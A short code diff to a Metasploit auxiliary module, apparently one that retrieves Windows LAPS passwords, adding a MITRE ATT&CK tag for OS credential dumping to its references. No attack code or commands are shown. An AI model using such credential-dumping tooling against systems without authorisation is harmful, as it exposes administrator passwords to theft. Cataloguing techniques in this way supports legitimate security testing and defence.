@@ -40,7 +40,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References' => [
           ['URL', 'https://blog.xpnsec.com/lapsv2-internals/'],
-          ['URL', 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py']
+          ['URL', 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py'],
+          ['ATT&CK', Mitre::Attack::Technique::T1003_OS_CREDENTIAL_DUMPING]
         ],
         'DisclosureDate' => '2020-07-23',
         'License' => MSF_LICENSE,
